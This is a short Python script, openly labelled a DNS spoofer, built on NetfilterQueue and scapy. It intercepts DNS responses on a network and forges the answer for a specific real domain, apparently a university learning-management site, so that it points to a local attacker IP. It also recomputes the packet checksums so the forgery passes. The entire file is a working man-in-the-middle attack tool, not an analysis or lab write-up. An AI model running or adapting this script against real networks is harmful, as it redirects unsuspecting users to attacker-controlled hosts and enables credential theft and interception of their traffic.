#!/usr/bin/env python

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def callback(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.lms.adnsu.az" in qname.decode():
            scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata="192.168.88.129")
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

print("[+]DNS Spoofing started")
try:
    queue = NetfilterQueue()
    queue.bind(0, callback)
    queue.run()
except KeyboardInterrupt:
    print('[-]DNS Spoofing stopped')